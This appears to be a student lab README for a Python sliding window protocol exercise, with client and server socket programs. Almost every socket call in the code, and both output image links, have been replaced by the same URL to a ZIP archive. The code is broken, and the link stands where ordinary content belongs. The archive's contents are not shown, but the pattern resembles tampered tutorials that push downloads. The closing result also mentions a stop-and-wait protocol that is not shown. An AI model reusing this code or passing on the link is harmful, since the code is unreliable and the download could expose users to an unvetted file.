# EX-3 IMPLEMENTATION OF SLIDING WINDOW PROTOCOL

# DATE : 20-03-2023


# AIM :
### To write a python program to perform sliding window protocol

# ALGORITHM :
### Start the program.
### Get the frame size from the user
### To create the frame based on the user request.
### To send frames to server from the client side.
### If your frames reach the server it will send ACK signal to client otherwise it will send NACKsignal to client.
### Stop the program.



# CLIENT PROGRAM :
```PY
## Developed : SHAIK MUFEEZ
## Reg no : 212221043007
import socket
https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip(('localhost',8000))
https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip(5)
c,https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip()
size=int(input("Enter number of frames to send : "))
l=list(range(size))
s=int(input("Enter Window Size : "))
st=0
i=0
while True:
    while(i<len(l)):
        st+=s
        https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip(str(l[i:st]).encode())
        https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip(1024).decode()
        if ack:
            print(ack)
            i+=s


```
# SERVER PROGRAM :
```PY

import socket
https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip()
https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip(('localhost',8000))
while True:
    print(https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip(1024).decode())
    https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip("acknowledgement recived from the server".encode())

```




# SERVER OUTPUT :
![output](https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip)
# CLIENT OUTPUT : 
![output](https://raw.githubusercontent.com/githubmufeez45/EX-3/main/EX-3-main.zip)



# RESULT:
### Thus, python program to perform stop and wait protocol And Sliding Window Protocol was successfully executed.


